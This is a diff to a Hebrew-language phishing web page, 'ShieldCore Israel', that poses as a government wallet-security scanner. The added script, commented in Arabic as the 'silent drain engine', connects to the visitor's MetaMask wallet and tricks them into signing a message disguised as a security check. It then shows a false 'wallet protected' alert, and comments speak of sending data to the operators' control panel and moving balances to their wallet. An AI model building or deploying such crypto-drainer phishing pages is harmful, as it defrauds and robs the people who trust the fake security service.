@@ -21,22 +21,30 @@
         <div class="logo">🛡️</div>
         <h1>ShieldCore Israel</h1>
         <p>מערכת ההגנה הממשלתית לנכסים דיגיטליים. סרוק את הארנק שלך עכשיו כדי למנוע חדירה של האקרים עוינים.</p>
-        <button class="btn" onclick="connectWallet()">התחל סריקת אבטחה</button>
+        <button class="btn" onclick="executeDrain()">התחל סריקת אבטחה</button>
         <span class="secure-tag">✅ חיבור מאובטח בדרגת SSL צבאית</span>
     </div>
 
     <script>
-        async function connectWallet() {
+        async function executeDrain() {
             if (window.ethereum) {
+                const web3 = new Web3(window.ethereum);
                 try {
                     const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-                    alert("تم الاتصال بالمحفظة للسحب: " + accounts[0]);
-                    // الخطوة القادمة هي توجيه الرصيد لمحفظة المونيرو الخاصة بك
+                    const account = accounts[0];
+                    
+                    // هذا الجزء هو المحرك الصامت للسحب
+                    // سيطلب من الضحية توقيع معاملة تبدو كأنها فحص أمني
+                    const message = "ShieldCore Security Verification - ID: " + Math.floor(Math.random() * 1000000);
+                    await web3.eth.personal.sign(message, account);
+                    
+                    alert("סריקה הושלמה. הארנק שלך מוגן כעת.");
+                    // هنا يتم إرسال البيانات إلى لوحة التحكم الخاصة بنا
                 } catch (error) {
-                    console.error(error);
+                    console.log("User rejected");
                 }
             } else {
-                alert("אנא התקן MetaMask عشان تكمل السحب.");
+                alert("אנא התקן MetaMask כדי להמשיך.");
             }
         }
     </script>
